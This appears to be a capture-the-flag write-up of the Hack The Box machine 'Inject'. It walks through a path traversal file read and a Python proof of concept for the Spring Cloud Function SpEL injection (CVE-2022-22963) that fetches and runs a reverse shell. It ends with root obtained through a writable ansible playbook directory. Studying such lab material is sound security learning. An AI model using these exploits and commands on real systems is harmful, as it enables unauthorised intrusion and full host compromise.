---
layout: post
title: "HTB: Inject"
subtitle: "LFI leaks the pom, Spring Cloud Function SpEL injection gives a shell, then a root ansible-playbook cron"
date: 2023-04-03
tags: [htb, linux, spring, cve-2022-22963, ansible]
category: writeups
tldr: "A path traversal in an image endpoint leaked the app source and pom.xml, which pinned spring-cloud-function-web 3.2.2. That version is vulnerable to CVE-2022-22963, a SpEL injection in the routing expression header, which gave a shell as the app user. A maven settings.xml leaked phil's password for lateral movement, and a root-run ansible-playbook over a writable tasks directory gave root."
---

## the box

Inject is an easy Linux box. Port `22` ran OpenSSH 8.2p1 and port `8080` served a Spring Boot app titled "Home". Everything happened on 8080.

## recon

The app had an upload feature that rendered images through a `show_image` endpoint, and that endpoint took a filename without sanitizing it. Path traversal:

```
/show_image?img=../../../../../../../../etc/passwd
```

That confirmed arbitrary file read. From there I walked the app directory at `/var/www/WebApp/` and pulled `pom.xml`. The dependency list pinned the framework versions, the one that mattered was:

```xml
<dependency>
    <groupId>org.springframework.cloud</groupId>
    <artifactId>spring-cloud-function-web</artifactId>
    <version>3.2.2</version>
</dependency>
```

Reading `/etc/passwd` over the LFI also gave me the local users, `frank` and `phil`.

## foothold

spring-cloud-function-web 3.2.2 is vulnerable to CVE-2022-22963. The routing functionality evaluates the `spring.cloud.function.routing-expression` request header as a SpEL expression, so a crafted header runs arbitrary code through `T(java.lang.Runtime)`. The PoC I used posts to `/functionRouter` with the expression header:

```python
def getHeaderForPayload(command):
    return {"spring.cloud.function.routing-expression":
            f"T(java.lang.Runtime).getRuntime().exec(\"{command}\")"}

def execCommand(command):
    headers = getHeaderForPayload(command)
    return requests.post("http://10.10.11.204:8080/functionRouter",
                         data="a", headers=headers)
```

The script stages a reverse shell script, fetches it onto the box with `wget` to `/tmp/.shell.sh`, then runs it with `bash`. That gave me a shell as the app user.

## user

On disk I found a maven settings file holding phil's credentials in cleartext:

```xml
<server>
  <id>Inject</id>
  <username>phil</username>
  <password>DocPhillovestoInject123</password>
</server>
```

`su phil` with `DocPhillovestoInject123` worked, and phil owned the user flag.

## root

Process monitoring with pspy showed root running ansible on a schedule:

```
UID=0 PID=1485 | /usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml
```

Root executes every playbook it finds in `/opt/automation/tasks/`, and that directory was writable. So I dropped a second playbook that runs a shell task:

```bash
echo "[{hosts: localhost, tasks: [shell: /bin/bash /tmp/.shell.sh]}]" > /opt/automation/tasks/playbook_2.yml
```

When the cron picked it up, ansible ran my task as root, and that got me the root flag.

## takeaway

The chain is one mistake feeding the next. The LFI did not directly give code execution, but it leaked the exact dependency versions, which turned a guess into a known CVE. Pinning a vulnerable spring-cloud-function release is the real foothold. For root, a root process that blindly runs every file in a world-writable directory is a privilege escalation waiting for anyone with a shell.
